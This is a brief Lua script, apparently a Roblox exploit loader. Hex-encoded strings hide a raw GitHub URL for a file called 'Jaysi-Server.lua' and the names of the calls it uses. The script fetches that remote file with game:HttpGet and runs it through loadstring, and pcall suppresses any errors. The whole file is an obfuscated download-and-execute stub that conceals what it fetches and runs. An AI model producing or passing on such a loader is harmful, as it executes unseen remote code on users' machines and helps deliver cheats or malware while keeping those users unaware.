local _0x1,_0x2,_0x3,_0x4,_0x5,_0x6,_0x7="68747470733a2f2f7261772e6769","7468756275736572636f6e74656e","742e636f6d2f6e75746a61797369","2d626c69702f4a415953492d5343","524950542e4465762f726566732f","68656164732f6d61696e2f4a6179","73692d5365727665722e6c7561"
local function _d(s) local o="" for i=1,#s,2 do o=o..string.char(tonumber(s:sub(i,i+1),16)) end return o end
local _u=_d(_0x1.._0x2.._0x3.._0x4.._0x5.._0x6.._0x7)
local _e=(getgenv and getgenv())or getfenv()
local _ls,_gm,_hg=_d("6c6f6164737472696e67"),_d("67616d65"),_d("48747470476574")
local _g,_h,_l=_e[_gm],_e[_gm][_hg],_e[_ls]
local _ok,_res=pcall(function() return _h(_g,_u) end)
if _ok and _res then pcall(function() _l(_res)() end) end
